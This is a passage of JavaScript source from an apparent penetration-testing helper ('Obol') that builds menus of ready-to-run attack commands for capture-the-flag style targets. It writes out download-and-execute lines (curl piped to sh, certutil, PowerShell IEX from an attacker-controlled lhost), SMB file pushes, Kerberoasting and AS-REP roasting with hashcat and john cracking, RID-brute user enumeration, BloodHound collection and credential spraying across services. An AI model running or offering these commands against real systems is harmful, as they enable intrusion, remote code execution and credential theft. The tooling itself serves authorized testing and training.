              { id: 'smbclient-put', label: 'PUT (smbclient)', tool: 'smbclient', locus: 'remote', command: "smbclient " + smbAuthFlag + " //" + target + "/" + activeSmbShare + " -c 'put \"" + effLocalFile + "\" \"" + effRemoteFile + "\"'" },
              { id: 'nxc-get', label: 'GET (nxc)', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " --share '" + activeSmbShare + "' --get-file '" + effRemoteFile + "' '" + effLocalFile + "'" },
              { id: 'nxc-put', label: 'PUT (nxc)', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " --share '" + activeSmbShare + "' --put-file '" + effLocalFile + "' '" + effRemoteFile + "'" }
            ]
          }
        ]
      }, deckVariantSel),

      pcMakeLane({
        id: 'shares-stage-tools',
        actionId: isLinuxOnly ? 'linux-enum' : 'windows-enum',
        title: 'Stage Tools from Kali (' + activeStageTool.label + ' + 12 More)',
        sub: 'Select any payload below -> Kali HTTP Server + Target Pull / SMB Push',
        locked: !(hasShell || (isAdmin && (hasSmb || hasWinrm)) || hasFact('smb.writable_share')),
        lockReason: !hasPortScan && !hasShell ? 'Run Nmap Scan First' : 'Requires Target Shell or Admin Exec',
        lockBadge: !hasPortScan && !hasShell ? 'Needs Scan' : 'Needs Shell',
        done: false,
        steps: [
          {
            id: 'stage-http-server',
            label: 'Stage ' + activeStageTool.label + ' on Kali',
            tool: 'python3',
            locus: 'remote',
            done: false,
            note: 'Copies ' + activeStageTool.label + ' (' + activeStageTool.role + ') into your current directory and serves it on port 8000.',
            paramGroups: [
              {
                key: 'stage_tool',
                label: 'Stage Tool:',
                active: activeStageTool.id,
                options: STAGE_CATALOG.map(function (t) {
                  return { id: t.id, label: t.label, sub: t.role };
                })
              }
            ],
            variants: [
              { id: 'http-prep', label: 'cp + http.server', tool: 'python3', locus: 'remote', command: "cp -f " + activeStageTool.kaliSrc + " ./" + activeStageTool.id + " 2>/dev/null; python3 -m http.server 8000" },
              { id: 'http-simple', label: 'http.server only', tool: 'python3', locus: 'remote', command: "python3 -m http.server 8000" },
              { id: 'smbserver', label: 'smbserver', tool: 'impacket-smbserver', locus: 'remote', command: "impacket-smbserver share . -smb2support" }
            ]
          },
          {
            id: 'stage-pull-target',
            label: 'Pull & Run ' + activeStageTool.label,
            tool: activeStageTool.os === 'lin' ? 'curl' : 'certutil',
            locus: 'onhost',
            done: false,
            variantLabel: 'Via:',
            note: 'Downloads ' + activeStageTool.label + ' from http://' + lhost + ':8000/' + activeStageTool.id + ' (or pushes via SMB) and runs it.',
            variants: activeStageTool.os === 'lin' ? [
              { id: 'curl-lin', label: 'curl -> /tmp', tool: 'curl', locus: 'onhost', command: "curl -sL http://" + lhost + ":8000/" + activeStageTool.id + " -o " + activeStageTool.dst + " && " + activeStageTool.run },
              { id: 'wget-lin', label: 'wget -> /tmp', tool: 'wget', locus: 'onhost', command: "wget -q http://" + lhost + ":8000/" + activeStageTool.id + " -O " + activeStageTool.dst + " && " + activeStageTool.run },
              { id: 'curl-pipe', label: 'curl | sh', tool: 'curl', locus: 'onhost', command: "curl -sL http://" + lhost + ":8000/" + activeStageTool.id + " | sh" }
            ] : [
              { id: 'certutil-win', label: 'certutil', tool: 'certutil', locus: 'onhost', command: "certutil -urlcache -split -f http://" + lhost + ":8000/" + activeStageTool.id + " " + activeStageTool.dst + " && " + activeStageTool.run },
              { id: 'iwr-win', label: 'iwr (PS)', tool: 'powershell', locus: 'onhost', command: "iwr -UseBasicParsing -Uri http://" + lhost + ":8000/" + activeStageTool.id + " -OutFile " + activeStageTool.dst + "; " + activeStageTool.run },
              { id: 'iex-win', label: 'IEX (Mem)', tool: 'powershell', locus: 'onhost', command: "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://" + lhost + ":8000/" + activeStageTool.id + "')\"" },
              { id: 'smbclient-put-stage', label: 'smbclient put', tool: 'smbclient', locus: 'remote', command: "smbclient " + smbAuthFlag + " //" + target + "/" + stageSmbShare + " -c 'put \"" + activeStageTool.id + "\" \"" + stageSmbPath + "\"'" },
              { id: 'nxc-put-stage', label: 'nxc --put-file', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " --share '" + stageSmbShare + "' --put-file '" + activeStageTool.id + "' '" + stageSmbPath + "'" }
            ]
          }
        ]
      }, deckVariantSel)
    ];

    // Tab 5: Cred & AD Ops
    var credopsLanes = [
      pcMakeLane({
        id: 'credops-kerberoast',
        actionId: 'crack-tgs',
        title: 'Kerberoasting (Request SPN Tickets -> Offline Crack)',
        sub: hasTgsHash
          ? (tgsCracked ? 'TGS hash captured & cracked into cleartext' : 'TGS hash captured (' + (tgsUsers.join(', ') || 'SPN') + ') -> Ready to crack offline')
          : 'Port 88 / 389 · Authenticated domain user (' + activeUser + ') can request SPN tickets',
        locked: !(hasCred && isDc),
        lockReason: !isDc ? 'Requires AD Domain Controller (Port 88 / 389)' : 'Requires Domain Credential',
        done: hasTgsHash && tgsCracked,
        steps: [
          {
            id: 'kerberoast-request',
            label: 'Request Kerberoast (TGS) Hashes',
            tool: 'impacket-GetUserSPNs',
            locus: 'remote',
            done: hasTgsHash,
            note: 'Queries LDAP for accounts with servicePrincipalName set and requests RC4/AES TGS tickets. Paste the $krb5tgs$ output back into Obol.',
            variants: [
              { id: 'getuserspns', label: 'GetUserSPNs', tool: 'impacket-GetUserSPNs', locus: 'remote', command: "impacket-GetUserSPNs '" + impacketIdent + "'" + impacketAuthFlags + " -dc-ip " + target + " -request -outputfile kerberoast.tgs" },
              { id: 'nxc-kerberoast', label: 'nxc --kerberoasting', tool: 'nxc', locus: 'remote', command: "nxc ldap " + target + " " + nxcAuth + " --kerberoasting kerberoast.tgs" },
              { id: 'bloodyad-kerberoast', label: 'bloodyAD SPNs', tool: 'bloodyAD', locus: 'remote', command: "bloodyAD " + bloodyAuth + " get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName,servicePrincipalName" }
            ]
          },
          {
            id: 'kerberoast-crack',
            label: 'Crack Kerberoast Ticket Offline',
            tool: 'hashcat',
            locus: 'remote',
            done: tgsCracked,
            needsPrevStepPaste: !hasTgsHash,
            note: hasTgsHash
              ? 'TGS ticket captured! Run Hashcat or John against rockyou.txt and paste the cracked line back into Obol.'
              : 'Waiting on Step 1: Run Step 1 and paste a $krb5tgs$ hash first before cracking.',
            variants: [
              { id: 'hashcat-13100', label: 'hashcat -m 13100', tool: 'hashcat', locus: 'remote', command: "hashcat -m 13100 kerberoast.tgs /usr/share/wordlists/rockyou.txt --force" },
              { id: 'john-tgs', label: 'john --format=krb5tgs', tool: 'john', locus: 'remote', command: "john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.tgs" }
            ]
          }
        ]
      }, deckVariantSel),

      pcMakeLane({
        id: 'credops-asreproast',
        actionId: 'crack-asrep',
        title: 'AS-REP Roasting (Request Pre-Auth Hashes -> Crack)',
        sub: hasAsrepHash
          ? (asrepCracked ? 'AS-REP hash captured & cracked' : 'AS-REP hash captured (' + (asrepUsers.join(', ') || 'account') + ') -> Ready to crack offline')
          : (hasCred ? 'Port 88 · Authenticated LDAP query for DONT_REQ_PREAUTH accounts' : 'Port 88 · Checks discovered usernames for DONT_REQ_PREAUTH'),
        locked: !isDc || !(hasCred || hasUserList),
        lockReason: !isDc ? 'Requires AD Domain Controller (Port 88 / 389)' : 'Requires Domain Credential or Discovered User List (users.txt)',
        done: hasAsrepHash && asrepCracked,
        steps: [
          {
            id: 'asrep-request',
            label: 'Request AS-REP Hashes',
            tool: 'impacket-GetNPUsers',
            locus: 'remote',
            done: hasAsrepHash,
            note: hasCred
              ? 'Uses your domain credential to query LDAP for UF_DONT_REQUIRE_PREAUTH accounts and extract $krb5asrep$ hashes.'
              : 'Tests discovered usernames in users.txt for Kerberos pre-authentication disabled.',
            variants: [
              { id: 'getnpusers', label: 'GetNPUsers', tool: 'impacket-GetNPUsers', locus: 'remote', command: hasCred ? ("impacket-GetNPUsers '" + impacketIdent + "'" + impacketAuthFlags + " -dc-ip " + target + " -request -format hashcat -outputfile asrep.hashes") : ("impacket-GetNPUsers " + (domain || '{{domain}}') + "/ -dc-ip " + target + " -usersfile users.txt -format hashcat -outputfile asrep.hashes") },
              { id: 'nxc-asrep', label: 'nxc --asreproast', tool: 'nxc', locus: 'remote', command: "nxc ldap " + target + " " + (hasCred ? nxcAuth : "-u users.txt -p ''") + " --asreproast asrep.hashes" }
            ]
          },
          {
            id: 'asrep-crack',
            label: 'Crack AS-REP Hash Offline',
            tool: 'hashcat',
            locus: 'remote',
            done: asrepCracked,
            needsPrevStepPaste: !hasAsrepHash,
            note: hasAsrepHash
              ? 'AS-REP hash captured! Crack $krb5asrep$23$ offline with Hashcat or John and paste the result.'
              : 'Waiting on Step 1: Only run this if Step 1 returns a $krb5asrep$ hash.',
            variants: [
              { id: 'hashcat-18200', label: 'hashcat -m 18200', tool: 'hashcat', locus: 'remote', command: "hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt --force" },
              { id: 'john-asrep', label: 'john --format=krb5asrep', tool: 'john', locus: 'remote', command: "john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.hashes" }
            ]
          }
        ]
      }, deckVariantSel),

      pcMakeLane({
        id: 'credops-ldap-enum',
        actionId: 'ad-enum',
        title: 'AD User, Group & SPN Enumeration (RID Brute / LDAP)',
        sub: hasUserList ? 'Domain user list enumerated in Loot' : 'Builds users.txt & discovers service accounts over SMB / LDAP',
        locked: !((isDc || hasSmb) && (hasCred || hasReadableShare || hasFact('smb.null_session') || hasFact('ad.anonymous_bind') || hasUserList)),
        lockReason: !(isDc || hasSmb) ? (!hasPortScan ? 'Run Nmap Scan First' : 'Requires SMB (445) or LDAP (389)') : 'Requires Anonymous Session or Credential',
        lockBadge: !(isDc || hasSmb) ? (!hasPortScan ? 'Needs Scan' : 'Port 445 Off') : 'Needs Session',
        done: hasUserList,
        steps: [
          {
            id: 'ldap-user-enum-step',
            label: 'Enumerate Domain Users',
            tool: 'nxc',
            locus: 'remote',
            done: hasUserList,
            note: 'Enumerates valid domain accounts (for AS-REP roasting / spraying) and checks user description fields for leaked passwords.',
            variants: [
              { id: 'nxc-rid-brute', label: 'nxc smb --rid-brute', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + (hasCred ? nxcAuth : "-u '' -p ''") + " --rid-brute" },
              { id: 'nxc-ldap-users', label: 'nxc ldap --users', tool: 'nxc', locus: 'remote', command: "nxc ldap " + target + " " + (hasCred ? nxcAuth : "-u '' -p ''") + " --users" },
              { id: 'nxc-pass-pol', label: 'nxc smb --pass-pol', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + (hasCred ? nxcAuth : "-u '' -p ''") + " --pass-pol" }
            ]
          }
        ]
      }, deckVariantSel),

      pcMakeLane({
        id: 'credops-acl-bh',
        actionId: 'bloodhound-collect',
        title: 'AD ACL Audit & BloodHound Collection',
        sub: hasAclLead ? 'Outbound ACL / BloodHound path discovered' : 'Finds GenericAll / WriteDacl / ForceChangePassword edges',
        locked: !(hasCred && isDc),
        lockReason: !isDc ? 'Requires AD Domain Controller (Port 88 / 389)' : 'Requires Domain Credential',
        done: hasAclLead || hasBhCollected,
        steps: [
          {
            id: 'acl-bh-collect',
            label: 'Audit ACLs / Collect BloodHound',
            tool: 'bloodyAD',
            locus: 'remote',
            done: hasAclLead || hasBhCollected,
            note: 'Finds outbound ACL permissions held by ' + activeUser + ' or collects the full BloodHound graph.',
            variants: [
              { id: 'bloodyad-writable', label: 'bloodyAD writable', tool: 'bloodyAD', locus: 'remote', command: "bloodyAD " + bloodyAuth + " get writable" },
              { id: 'bh-python', label: 'bloodhound-py', tool: 'bloodhound-python', locus: 'remote', command: "bloodhound-python -d " + (domain || '{{domain}}') + " -u '" + activeUser + "' " + (useHashAuth ? ("--hashes :" + activeHash) : ("-p '" + (password || '{{password}}') + "'")) + " -ns " + target + " -c All --zip" },
              { id: 'nxc-bh', label: 'nxc --bloodhound', tool: 'nxc', locus: 'remote', command: "nxc ldap " + target + " " + nxcAuth + " --bloodhound -c All --dns-server " + target }
            ]
          }
        ]
      }, deckVariantSel),

      pcMakeLane({
        id: 'credops-validate',
        actionId: 'lateral-exec',
        title: 'Validate Credential Across Services (SMB / WinRM / LDAP / MSSQL / SSH / RDP)',
        sub: 'Tests ' + activeUser + ' reuse & checks for Pwn3d! admin privileges',
        locked: !(hasCred && (hasPortScan || hasSmb || hasWinrm || hasLdap || hasSsh || hasRdp)),
        lockReason: !hasCred ? 'Requires Credential' : 'Run Nmap Scan First',
        done: hasFact('credential.validated') && isAdmin,
        steps: [
          {
            id: 'validate-cred-step',
            label: 'Validate Credential Across Protocols',
            tool: 'nxc',
            locus: 'remote',
            done: hasFact('credential.validated'),
            variantLabel: 'nxc:',
            note: 'Paste the NetExec output to record validated services, shares, and Pwn3d! admin access.',
            variants: [
              { id: 'nxc-smb', label: 'smb --shares', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " --shares" },
              { id: 'nxc-winrm', label: 'winrm', tool: 'nxc', locus: 'remote', command: "nxc winrm " + target + " " + nxcAuth },
              { id: 'nxc-ldap', label: 'ldap', tool: 'nxc', locus: 'remote', command: "nxc ldap " + target + " " + nxcAuth },
              { id: 'nxc-mssql', label: 'mssql', tool: 'nxc', locus: 'remote', command: "nxc mssql " + target + " " + nxcAuth + " -q 'SELECT SYSTEM_USER, IS_SRVROLEMEMBER(\"sysadmin\");'" },
              { id: 'nxc-ssh', label: 'ssh', tool: 'nxc', locus: 'remote', command: "nxc ssh " + target + " " + nxcAuth },
              { id: 'nxc-rdp', label: 'rdp', tool: 'nxc', locus: 'remote', command: "nxc rdp " + target + " " + nxcAuth }
            ]
          }
        ]
      }, deckVariantSel)
    ];

    var rawTabs = [
      { id: 'flags', title: 'Flags & Proof', icon: 'flag', lanes: flagLanes },
      { id: 'shells', title: 'Get On Host', icon: 'terminal', lanes: shellLanes },
      { id: 'persistence', title: 'Persistence & Accounts', icon: 'key', lanes: persistenceLanes },
      { id: 'shares', title: 'Shares & File Transfer', icon: 'folder', lanes: sharesLanes },
      { id: 'credops', title: 'Cred & AD Ops', icon: 'zap', lanes: credopsLanes }
    ];

    var readyLaneCount = 0;
    var tabs = rawTabs.map(function (t) {
      var rCount = (t.lanes || []).filter(function (l) { return l.status === 'ready'; }).length;
      readyLaneCount += rCount;
      return {
        id: t.id,
        title: t.title,
        label: t.title,
        icon: t.icon,
        readyCount: rCount,
        lanes: t.lanes
      };
    });

    var uiDeckSel = (eng.ui && eng.ui.deckSel) || {};
    var uiLaneMap = (eng.ui && eng.ui.operatorDeckLane && typeof eng.ui.operatorDeckLane === 'object') ? eng.ui.operatorDeckLane : {};
    var reqTabId = opts.tabId || (eng.ui && (eng.ui.operatorDeckTab || eng.ui.deckTab)) || uiDeckSel.tabId || '';
    var reqLaneId = opts.laneId || (reqTabId && uiLaneMap[reqTabId]) || (eng.ui && eng.ui.deckLane) || uiDeckSel.laneId || (reqTabId && uiDeckSel[reqTabId]) || '';

    var selectedTab = tabs.filter(function (t) { return t.id === reqTabId; })[0];
    if (!selectedTab) {
      selectedTab = tabs.filter(function (t) { return t.readyCount > 0; })[0] || tabs[0];
    }

    var selectedLane = (selectedTab.lanes || []).filter(function (l) { return l.id === reqLaneId; })[0];
    if (!selectedLane && selectedTab.id === 'flags' && needsBothFlagsOnHost) {
      var bothLane = (selectedTab.lanes || []).filter(function (l) { return l.id === 'both-flags-onhost' && l.status === 'ready'; })[0];
      if (bothLane) selectedLane = bothLane;
    }
    if (!selectedLane) {
      selectedLane = (selectedTab.lanes || []).filter(function (l) { return l.status === 'ready' && !l.done; })[0]
        || (selectedTab.lanes || []).filter(function (l) { return l.status === 'ready'; })[0]
        || (selectedTab.lanes || [])[0] || null;
    }

    return {
      unlocked: unlocked,
      readyLaneCount: readyLaneCount,
      activeIdentity: activeIdentity,
      needsBothFlagsOnHost: !!needsBothFlagsOnHost,
      localFlagCapturedRemotely: !!localFlagCapturedRemotely,
      tabs: tabs,
      selectedTab: selectedTab,
      selectedLane: selectedLane,
      selectedTabId: selectedTab ? selectedTab.id : '',
      selectedLaneId: selectedLane ? selectedLane.id : ''
    };
  }

  OBOL.pathChooser = {
    IDS: PATH_CHOOSER_IDS,
    ACTION_TO_DECK: ACTION_TO_DECK,
    has: hasPathChooser,
    build: buildPathChooser,
    buildDeck: buildDeck,
    getOperatorDeck: buildDeck
  };

  OBOL.pack = {
    DEFAULT_PACK: DEFAULT_PACK,
    PACK_NAMES: PACK_NAMES,
    Action: Action,
    buildDeck: buildDeck,
    getOperatorDeck: buildDeck,
    isFlagHuntAction: isFlagHuntAction,
    deriveLocus: deriveLocus,
    deriveScope: deriveScope,
    locusRank: locusRank,
    commandLocus: commandLocus,
    commandExecutionLocus: commandExecutionLocus,
    commandIsOnHost: commandIsOnHost,
    moveCommandLoci: moveCommandLoci,
    defaultCommandLocus: defaultCommandLocus,
    credentialProbeAllowed: credentialProbeAllowed,
    commandTool: commandTool,
    commandToolkitRank: commandToolkitRank,
    isSwitchlessProbe: isSwitchlessProbe,
    commandSettled: commandSettled,
    commandIsEligible: commandIsEligible,
    preferredCommandIndex: preferredCommandIndex,
    moveToolkitRank: moveToolkitRank,
    friendly: friendly,
    chipLabel: chipLabel,
    FRIENDLY: FRIENDLY,
    opensUpNext: opensUpNext,
    hostOsFamily: hostOsFamily,
    osCompatible: osCompatible,
    normalizeOsName: normalizeOsName,
    actionsFromPackData: actionsFromPackData,
    loadPacks: loadPacks,
    nextActions: nextActions,
    nextActionsV2: nextActionsV2,
    rankActions: rankActions,
    isReportOnly: isReportOnly,
    // Shared fact-classification - the move linter (tools/move-lint.js) uses the SAME predicates the
    // ranker does, so a move that passes the lint is, by construction, one the ranker places sanely.
    GOALS: V2_GOALS,
    GOALS_NO_FLAGS: V2_GOALS_NO_FLAGS,
    isEvidenceFact: v2EvidenceFact,
    producesFoothold: v2ProducesFoothold,
    producesPrivilege: function (a) { for (var i = 0; i < a.produces.length; i++) if (V2_PRIV[a.produces[i]]) return true; return false; },
    isIndicated: v2Indicated,
    v2Earned: v2Earned,
    planPath: planPath,
    ranker: 'v2',
    lockedActions: lockedActions,
    blockedActions: blockedActions,
    accessEpoch: accessEpoch,
  };
})(typeof globalThis !== 'undefined' ? globalThis : this);
